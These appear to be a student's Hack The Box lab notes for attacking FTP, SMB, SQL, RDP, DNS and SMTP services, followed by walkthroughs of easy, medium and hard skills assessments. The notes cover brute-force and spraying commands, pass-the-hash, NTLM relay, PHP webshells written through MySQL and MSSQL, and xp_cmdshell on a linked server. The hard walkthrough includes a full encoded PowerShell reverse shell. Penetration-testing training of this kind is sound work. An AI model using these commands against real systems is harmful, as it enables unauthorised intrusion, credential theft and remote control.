FTP
#### Attacking FTP
```shell-session
## Enumeration

sudo nmap -sC -sV -p 21 192.168.2.142 

## Misconfigurations

ftp 192.168.2.142 

## Protocol Specifics Attacks

medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp 

nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2

// Skills extra
ftp 10.129.172.226 -p 2121

medusa -U user.list -P password.list -h 10.129.172.226 -M ftp -n 2121 -t 64

ssh robin@10.129.172.226
```

## SMB
#### Attacking SMB
```shell-session
## Enumeration

sudo nmap 10.129.14.128 -sV -sC -p139,445

## Misconfigurations

smbclient -N -L //10.129.14.128

smbmap -H 10.129.14.128

smbmap -H 10.129.14.128 -r notes

smbmap -H 10.129.14.128 --download "notes\note.txt"

smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"

rpcclient -U'%' 10.10.110.17

./enum4linux-ng.py 10.10.11.45 -A -C

## Protocol Specifics Attacks

cat /tmp/userlist.txt

crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth

smbclient -U user \\\\10.129.42.197\\SHARENAME

impacket-psexec administrator:'Password123!'@10.10.110.17

crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec

crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users

crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam

crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE

Forced-authentication, unsure but include

sudo responder -I ens33

hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

cat /etc/responder/Responder.conf | grep 'SMB ='

impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146

impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e JABjA...'

nc -lvnp 9001

// Skills
crackmapexec smb 10.129.68.220 -u "jason" -p pws.list --local-auth 

smbclient -U "jason" \\\\10.129.68.220\\GGJ

smbmap -H 10.129.68.220 -u "jason" -p '34c8zuNBo91!@28Bszh' --download "GGJ\id_rsa"

ssh jason@10.129.68.220 -i id_rsa
```

## SQL Databases

#### Attacking SQL Databases
```shell-session
## Enumeration

nmap -Pn -sV -sC -p1433 10.10.10.125

## Protocol Specific Attacks

mysql -u julio -pPassword123 -h 10.129.20.13

C:\htb> sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30

**Note:** When we authenticate to MSSQL using `sqlcmd` we can use the parameters `-y` (SQLCMDMAXVARTYPEWIDTH) and `-Y` (SQLCMDMAXFIXEDTYPEWIDTH) for better looking output. Keep in mind it may affect performance.

sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h

mssqlclient.py -p 1433 julio@10.129.203.7 

**Note:** When we authenticate to MSSQL using `sqsh` we can use the parameters `-h` to disable headers and footers for a cleaner look.

**Note:** We will get an error if we try to list or connect to a database we don't have permissions to.

sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h
	
mysql> SHOW DATABASES;

1> SELECT name FROM master.dbo.sysdatabases
2> GO
	
mysql> USE htbusers;

1> USE htbusers
2> GO

mysql> SHOW TABLES;

1> SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
2> GO

mysql> SELECT * FROM users;

1> SELECT * FROM users
2> go

## Execute Commands

1> xp_cmdshell 'whoami'
2> GO

-- To allow advanced options to be changed.  
EXECUTE sp_configure 'show advanced options', 1
GO

-- To update the currently configured value for advanced options.  
RECONFIGURE
GO  

-- To enable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 1
GO  

-- To update the currently configured value for this feature.  
RECONFIGURE
GO

## Write Local Files

mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';

mysql> show variables like "secure_file_priv";

1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO

1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO

## Read Local Files

1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
2> GO

mysql> select LOAD_FILE("/etc/passwd");

## Capture MSSQL Service Hash

1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
2> GO

1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
2> GO

sudo responder -I tun0

sudo impacket-smbserver share ./ -smb2support

## Impersonate Existing Users with MSSQL

1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO

1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go

1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO

**Note:** It's recommended to run `EXECUTE AS LOGIN` within the master DB, because all users, by default, have access to that database. If a user you are trying to impersonate doesn't have access to the DB you are connecting to it will present an error. Try to move to the master DB using `USE master`.

**Note:** If we find a user who is not sysadmin, we can still check if the user has access to other databases or linked servers.

## Communicate with Other Databases with MSSQL

1> SELECT srvname, isremote FROM sysservers
2> GO

1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
2> GO

**Note:** If we need to use quotes in our query to the linked server, we need to use single double quotes to escape the single quote. To run multiples commands at once we can divide them up with a semi colon (;).

// Skills
mssqlclient.py -p 1433 htbdbuser@10.129.209.108


EXEC master..xp_dirtree '\\10.10.110.17\share\'
GO

EXEC master..xp_subdirs '\\10.10.110.17\share\'
GO

sudo responder -I tun0

hashcat -m 5600 sql_hash /usr/share/wordlists/rockyou.txt

sqsh -S 10.129.191.11 -U ..\\mssqlsvc -P 'princess1' -h

select name from master.dbo.sysdatabases
go
use flagDB
go
select table_name from flagDB.INFORMATION_SCHEMA.TABLES
go
```

RDP
#### Attacking RDP
```shell-session

## Enumeration
nmap -Pn -p3389 192.168.2.143 

## Misconfgiurations

cat usernames.txt 

crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'

hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp

/xfreerdp /v:192.168.2.143 /u: admin /p: password123

## Protocol Specific Attacks

tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}

query user

net start sessionhijack

_Note: This method no longer works on Server 2019._

## RDP Pass-the-Hash (PtH)

C:\htb> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9

// skills
xfreerdp /v:10.129.203.13 /u:htb-rdp /p:'HTBRocks!' /tls-seclevel:0 /timeout:80000

C:\htb> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

xfreerdp /v:10.129.203.13 /u:Administrator /pth:0E14B9D6330BF16C30B1924111104824 /tls-seclevel:0 /timeout:80000
```

## Dns

#### Attacking DNS
```shell-session
## Enumeration
nmap -p53 -Pn -sV -sC 10.10.110.213

## DNS Zone Transfer

dig AXFR @ns1.inlanefreight.htb inlanefreight.htb

fierce --domain zonetransfer.me

## Domain Takeovers & Subdomain Enumeration
	
./subfinder -d inlanefreight.com -v    

areaeric@htb[/htb]$ git clone https://github.com/TheRook/subbrute.git >> /dev/null 2>&1
areaeric@htb[/htb]$ cd subbrute
areaeric@htb[/htb]$ echo "ns1.inlanefreight.com" > ./resolvers.txt
areaeric@htb[/htb]$ ./subbrute inlanefreight.com -s ./names.txt -r ./resolvers.txt

host support.inlanefreight.com

// Local DNS Cache Posioning, not sure but incldued

## DNS Spoofing
cat /etc/ettercap/etter.dns

ping inlanefreight.com

// skills
echo "10.129.199.223" > ./resolvers.txt

python3 subbrute.py inlanefreight.htb -s ./names.txt -r ./resolvers.txt

dig AXFR @10.129.199.223 hr.inlanefreight.htb  
```

## SMTP

#### Attacking Email Services
```shell-session
## Enumeration

host -t MX hackthebox.eu

host -t MX microsoft.com

dig mx plaintext.do | grep "MX" | grep -v ";"

dig mx inlanefreight.com | grep "MX" | grep -v ";"

host -t A mail1.inlanefreight.htb.

sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.14.128

## Misconfigurations

telnet 10.10.110.20 25

VRFY root
252 2.0.0 root
VRFY www-data
252 2.0.0 www-data
VRFY new-user
550 5.1.1 <new-user>: Recipient address rejected: User unknown in local recipient table

telnet 10.10.110.20 25
EXPN john
250 2.1.0 john@inlanefreight.htb
EXPN support-team
250 2.0.0 carol@inlanefreight.htb
250 2.1.5 elisa@inlanefreight.htb

telnet 10.10.110.20 25
MAIL FROM:test@htb.com
it is

250 2.1.0 test@htb.com... Sender ok
RCPT TO:julio
550 5.1.1 julio... User unknown
RCPT TO:kate
550 5.1.1 kate... User unknown
RCPT TO:john
250 2.1.5 john... Recipient ok

telnet 10.10.110.20 110

USER julio
-ERR
USER john
+OK

smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7

## Cloud Enumeration
python3 o365spray.py --validate --domain msplaintext.xyz

python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz     

## Password Attacks
hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3

python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz

## Protocol Specifics Attacks
nmap -p25 -Pn --script smtp-open-relay 10.10.11.213

swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213

// Skills
smtp-user-enum -M RCPT -U user.list -D inlanefreight.htb -t 10.129.107.120

hydra -t 64 -l 'marlin@inlanefreight.htb' -P pws.list -f 10.129.107.120 imap


telnet 10.129.107.120 143

1 LOGIN marlin@inlanefreight.htb poohbear
1 LIST "" *
1 SELECT INBOX

1 FETCH 2 RFC822 
```

Skills easy
```
sudo nmap 10.129.221.62
sudo nmap -p- 10.129.221.62

sudo nmap -sC -sV -p 21 10.129.221.62
sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.221.62
sudo nmap -Pn -p3389 10.129.221.62

smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t 10.129.67.107
smtp-user-enum -M VRFY -U users.list -D inlanefreight.htb -t 10.129.67.107
smtp-user-enum -M EXPN -U users.list -D inlanefreight.htb -t 10.129.67.107

ftp brute force attempt:

hydra -l fiona -P pws.list 10.129.67.107 ftp -t 48
hydra -l fiona -P /usr/share/wordlists/rockyou.txt 10.129.67.107 ftp -t 64
-> fiona:987654321

ftp 10.129.67.107 

ls -la

get docs.txt
get WebServersInfo.txt

sudo nmap -Pn -sV -sC -p3306 10.129.67.107

mysql -u fiona -p987654321 -h 10.129.67.107

show variables like "secure_file_priv";

SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE 'C:\\xampp\\htdocs\\shell.php';

http://10.129.67.107/shell.php?c=where /R C:\ flag.txt   
-> C:\Users\Administrator\Desktop\flag.txt 

http://10.129.67.107/shell.php?c=more C:\Users\Administrator\Desktop\flag.txt 
-> HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49} 
```

Skills medium
```
sudo nmap -p- 10.129.201.127
sudo nmap 10.129.201.127 -Pn -p-

sudo nmap 10.129.201.127
-p22,53,110,995,2121
-ssh,dns,pop3,pop3s,ccproxy-ftp

sudo nmap -p53 -Pn -sV -sC 10.129.201.127

dig AXFR @10.129.201.127 inlanefreight.htb
-> int-ftp.inlanefreight.htb. 604800 IN A  127.0.0.1 

sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.201.127
-> no new info

telnet 10.129.201.127 110
-> fail

python3 o365spray.py --validate --domain inlanefreight.htb
-> fail

ftp 10.129.201.127 -p 2121
-> InlaneFTP, can't do much

ftp 10.129.201.127 -p 30021
-> Internal FTP
anonymous:
ls -la
->simon:mynotes.txt credentials

hydra -l simon -P mynotes.txt 10.129.201.127 ftp -s 2121 -t 48
simon:8Ns8j1b!23hs4921smHzwn

ftp 10.129.201.127 -p 2121
get flag.txt
```

#### Skills hard
```
sudo nmap 10.129.203.10
-p135,445,1433,3389
-smb,sql,rdp

sudo nmap -p- 10.129.203.10
sudo nmap -Pn -p- 10.129.203.10

sudo nmap 10.129.203.10 -sVC -p135,445,1433,3389


smbclient -N -L //10.129.203.10
-> allows annonymous authentication?
smbclient -U "simon" -L //10.129.203.10

crackmapexec smb 10.129.203.10 -u "simon" -p "" --shares
-> Allows user simon to login without password. 

smbclient -U simon \\\\10.129.203.10\\Home
-> obtained
	creds.txt from IT\fiona
	random.txt from IT\simon 
	information.txt, notes.txt, secrets.txt from IT\John

smbmap -H 10.129.203.10

hydra -l fiona -P creds.txt 10.129.203.10 rdp
-> fiona:48Ns72!bns74@S84NNNSl

Information.txt -> seems to be simulating an impersonation.
Secrets.txt -> seems to be password, matches well with random.txt

hydra -l john -P secrets.txt 10.129.203.10 rdp
hydra -l simon -P secrets.txt 10.129.203.10 rdp

xfreerdp /v:10.129.203.10 /u:fiona /p:'48Ns72!bns74@S84NNNSl' /tls-seclevel:0 /timeout:80000
-> no rdp attack (failed bc, not local admin)

sqsh -S 10.129.203.10 -U .\\fiona -P '48Ns72!bns74@S84NNNSl' -h
(bwaware its a non-domain joined user. )

1> USE TestingDB/TestAppDB
2> GO

SELECT table_name FROM TestingDB/TestAppDB.INFORMATION_SCHEMA.TABLES
-> TestingDB has nothing, TestAppDb can't access

sudo responder -I tun0

EXEC master..xp_dirtree '\\10.10.16.28\share\'
go
EXEC master..xp_subdirs '\\10.10.16.28\share\'
go
-> nothing

use master 
go
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO
-> john, simon

1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go

1> EXECUTE AS LOGIN = 'john/simon'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO
-> can only impersonate john, 'simon' does not exist apparently and john does not have admin privilege on this sql server. 

1> SELECT srvname, isremote FROM sysservers
2> GO
-> LOCAL.TEST.LINKED.SRV

EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [LOCAL.TEST.LINKED.SRV]
go
-> john is local admin on linked server. 

-- To allow advanced options to be changed.  
EXECUTE("EXEC sp_configure 'show advanced options', 1;") AT [LOCAL.TEST.LINKED.SRV] 

EXECUTE('sp_configure "show advanced options", 1') AT [LOCAL.TEST.LINKED.SRV]
go
EXECUTE('RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV]
go
EXECUTE('sp_configure "xp_cmdshell", 1') AT [LOCAL.TEST.LINKED.SRV]
go
EXECUTE('RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV]
go

EXECUTE('xp_cmdshell whoami;') AT [LOCAL.TEST.LINKED.SRV]
go
-> nt authority


EXECUTE('xp_cmdshell "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMgA4ACIALAA4ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="') AT [LOCAL.TEST.LINKED.SRV]
-> too long

EXECUTE('xp_cmdshell "more C:\users\administrator\Desktop\flag.txt"') AT [LOCAL.TEST.LINKED.SRV]
-> HTB{46u$!n9_l!nk3d_$3rv3r$

```